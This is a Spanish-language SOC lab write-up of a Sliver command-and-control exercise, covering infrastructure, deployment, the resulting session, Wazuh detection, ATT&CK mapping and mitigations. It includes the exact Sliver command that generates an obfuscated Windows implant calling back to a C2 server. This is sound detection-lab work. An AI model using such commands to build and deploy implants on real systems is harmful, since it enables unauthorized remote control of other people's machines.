# C2 Framework — Sliver

## Introducción
Documentación del C2 Framework implementado en el SOC Lab usando Sliver, un framework open source de Command & Control usado en operaciones de Red Team profesionales.

## Infraestructura
| Componente | Host | IP |
|---|---|---|
| Sliver Server | Kali Linux | 192.168.100.20 |
| Implant | Windows 10 | 192.168.100.30 |

## Herramienta
- **Sliver v1.7.3** — C2 Framework open source
- **Protocolo:** HTTP/HTTPS
- **Cifrado:** mTLS
- **Ofuscación de símbolos:** habilitada

## Generación del Implant

Comando usado para generar el implant:
generate --http 192.168.100.20 --os windows --arch amd64 --format exe --save /tmp/implant.exe

Características del implant:
- OS: Windows AMD64
- Protocolo: HTTP
- Ofuscación de símbolos habilitada
- Tiempo de compilación: 3m46s

## Despliegue
El implant fue transferido al win10 via HTTP y ejecutado desde C:\Windows\Temp\implant.exe

## Sesión C2 Establecida
- Session ID: 510b1232
- Hostname: DESKTOP-BFU9I3D
- IP: 192.168.100.30
- OS: windows/amd64
- Timestamp: 2026-05-31 21:48:00

## Capacidades del C2
- Ejecución remota de comandos
- Transferencia de archivos
- Persistencia post-reinicio
- Comunicaciones cifradas HTTPS
- Control de múltiples implants simultáneos
- Pivoting de red

## Detección Wazuh
- **Regla 92066** — implant.exe binary in suspicious location launched by powershell.exe
- **Sysmon EventID:** 1 (Process Create)
- **Timestamp:** 2026-05-31 21:47:59 UTC
- **Cadena:** powershell.exe → implant.exe

## Técnica MITRE ATT&CK
| Técnica | Táctica |
|---|---|
| T1071.001 - Web Protocols | Command and Control |
| T1573 - Encrypted Channel | Command and Control |
| T1059.001 - PowerShell | Execution |

## Mitigación
- Monitorear conexiones HTTP salientes a IPs no autorizadas
- Implementar proxy con inspección SSL
- Bloquear ejecución de binarios desde C:\Windows\Temp via AppLocker
- EDR para detección de comportamiento de implants C2
- Threat Hunting periódico buscando procesos con conexiones HTTP persistentes
